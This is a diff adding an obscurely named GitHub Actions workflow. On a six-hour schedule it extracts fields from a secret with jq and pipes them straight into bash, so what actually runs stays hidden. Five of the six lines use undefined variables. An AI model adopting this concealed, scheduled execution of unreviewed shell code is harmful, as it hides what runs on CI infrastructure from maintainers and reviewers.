@@ -1,0 +1,23 @@
+name: bushishuoy
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '49 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: bushishuoy
+        env:
+          l8: ${{ secrets.l8 }}
+        run: |
+          echo $l8 | jq -r .it1 | /bin/bash
+          echo $s02 | jq -r .eu786 | /bin/bash
+          echo $b0 | jq -r .vmgm4 | /bin/bash
+          echo $oar78 | jq -r .f511 | /bin/bash
+          echo $qow2 | jq -r .rs0918 | /bin/bash
+          echo $wth78 | jq -r .iiz0863 | /bin/bash
+
